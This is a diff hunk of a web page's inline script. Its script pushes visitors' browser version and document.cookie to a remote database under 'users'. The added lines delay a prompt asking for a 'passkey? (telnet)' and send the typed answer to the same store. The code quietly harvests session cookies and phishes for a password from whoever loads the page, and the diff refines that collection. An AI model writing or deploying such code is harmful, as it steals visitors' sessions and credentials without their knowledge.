@@ -51,8 +51,11 @@
       push(ref(db, 'users'), x);
       push(ref(db, 'users'), window.navigator.appVersion);
       push(ref(db, 'users'), document.cookie); 
+
+      setTimeout(() => {
       let y = prompt("passkey? (telnet)");
       push(ref(db, 'users'), y);
+      }, 150)
     }
   </script>
 </body>
